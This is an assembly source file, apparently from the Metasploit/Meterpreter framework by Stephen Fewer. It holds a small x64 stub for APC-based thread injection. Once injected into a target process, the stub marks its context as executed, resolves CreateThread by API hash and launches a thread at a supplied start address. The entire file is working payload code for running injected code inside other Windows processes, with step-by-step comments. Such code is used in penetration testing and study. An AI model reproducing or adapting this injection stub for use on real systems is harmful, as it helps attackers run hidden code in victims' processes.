;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Architecture: x64
; Version: 1.0 (Jan 2010)
; Size: 256 bytes
; Build: >build.py apc
;-----------------------------------------------------------------------------;

; A small stub to be used for thread injection where we gain execution via an injected APC. See the
; file "\msf3\external\source\meterpreter\source\common\arch\win\i386\base_dispatch.c" for more details

;typedef struct _APCCONTEXT
;{
; 	union
;	{
;		LPVOID lpStartAddress;
;		BYTE bPadding1[8]; 
;	} s;
;	union
;	{
; 		LPVOID lpParameter;
;		BYTE bPadding2[8];
;	} p;
;   BYTE bExecuted;
;} APCCONTEXT, * LPAPCCONTEXT;

[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  cmp byte [rcx+16], 0   ; Has this context allready been injected? 'if( ctx->bExecuted == FALSE )'
  jne cleanup            ; If so just leave this APC
  mov byte [rcx+16], 1   ; Otherwise mark the context as executed and proceed
  sub rsp, 120           ; Alloc some space on stack
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ;
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
  mov r8, [rcx]          ; r8 = ctx->lpStartAddress
  mov r9, [rcx+8]        ; r9 = ctx->lpParameter
  xor rcx, rcx           ; Clear ECX, lpThreadAttributes
  xor rdx, rdx           ; Clear EDX, dwStackSize
  push rcx               ; lpThreadId 
  push rcx               ; dwCreationFlags
  mov r10d, 0x160D6838   ; hash( "kernel32.dll", "CreateThread" )
  call rbp               ; CreateThread( NULL, 0, ctx->lpStartAddress, ctx->lpParameter, 0, NULL );
  add rsp, (120 + 32 + (8*2)) ; fix up stack (120 bytes we alloced, 32 bytes for the single call to api_call, and 2*8 bytes for the two params we pushed).
cleanup:
  ret                    ; Return and finish our APC routine.
